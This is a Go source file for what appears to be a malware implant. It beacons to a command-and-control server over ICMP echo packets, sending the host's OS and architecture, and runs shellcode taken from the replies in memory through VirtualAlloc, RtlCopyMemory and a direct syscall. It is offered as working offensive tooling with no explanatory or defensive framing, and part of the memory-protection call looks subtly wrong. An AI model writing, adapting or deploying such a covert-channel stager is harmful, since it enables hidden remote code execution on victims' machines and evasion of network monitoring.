package main

import (
	"bytes"
	"fmt"
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
	"log"
	"net"
	"runtime"
	"syscall"
	"time"
	"unsafe"
)

var (
	kernel32       = syscall.MustLoadDLL("kernel32.dll")
	virtualAlloc   = kernel32.MustFindProc("VirtualAlloc")
	virtualProtect = kernel32.MustFindProc("VirtualProtect")
	rtlCopyMemory  = kernel32.MustFindProc("RtlCopyMemory")
)

func runSC(shellcode []byte) {

	addr, _, _ := virtualAlloc.Call(0, uintptr(len(shellcode)), 0x1000|0x2000, 0x40)
	rtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	virtualProtect.Call(addr, uintptr(len(shellcode)), 0x20, uintptr(syscall.PAGE_READWRITE))
	syscall.Syscall(addr, 0, 0, 0, 0)
}

func main() {
	c2 := "x.x.x.x" // C2 Server IP

	shellcode := []byte("") // leave empty

	// detect OS
	var OS, arch []byte
	if runtime.GOOS == "windows" {
		OS = []byte("win")
	} else if runtime.GOOS == "linux" {
		OS = []byte("lin")
	}

	// detect arch
	if runtime.GOARCH == "amd64" {
		arch = []byte("64")
	} else if runtime.GOARCH == "386" {
		arch = []byte("32")
	}

	sysInfo := append(OS, arch...)

	packetconn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		log.Fatal(err)
	}
	defer packetconn.Close()

	for {
		time.Sleep(5 * time.Second)
		msg := &icmp.Message{
			Type: ipv4.ICMPTypeEcho,
			Code: 0,
			Body: &icmp.Echo{
				ID:   0x000f,
				Seq:  0,
				Data: sysInfo,
			},
		}

		wb, err := msg.Marshal(nil)
		if err != nil {
			log.Fatal(err)
		}

		dst, err := net.ResolveIPAddr("ip4", c2)
		if err != nil {
			log.Fatal(err)
		}

		if _, err := packetconn.WriteTo(wb, dst); err != nil {
			log.Fatal(err)
		}

		rb := make([]byte, 2000) // max size of SC
		packetconn.SetReadDeadline(time.Now().Add(5 * time.Second))
		n, _, err := packetconn.ReadFrom(rb)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				fmt.Println("Timeout occurred")
			} else {
				log.Fatal(err)
			}
		} else {
			rm, err := icmp.ParseMessage(1, rb[:n])
			if err != nil {
				log.Fatal(err)
			}

			switch rm.Type {
			case ipv4.ICMPTypeEchoReply:
				body, ok := rm.Body.(*icmp.Echo)
				if !ok {
					log.Fatalf("failed to cast body to Echo")
				}

				// check if C2 server is correctly configurated
				if bytes.Equal(body.Data, sysInfo) {
					fmt.Println("C2 Server reachable but service not running.")
				} else {
					if !bytes.Equal(shellcode, body.Data) {
						shellcode = body.Data
						fmt.Println("Payload executed.")

						go runSC(shellcode)
					} else {
						fmt.Println("Received payload is up to date. Nothing to execute.")
					}
				}
			default:
				fmt.Println("Failed: ", rm)
			}
		}
	}
}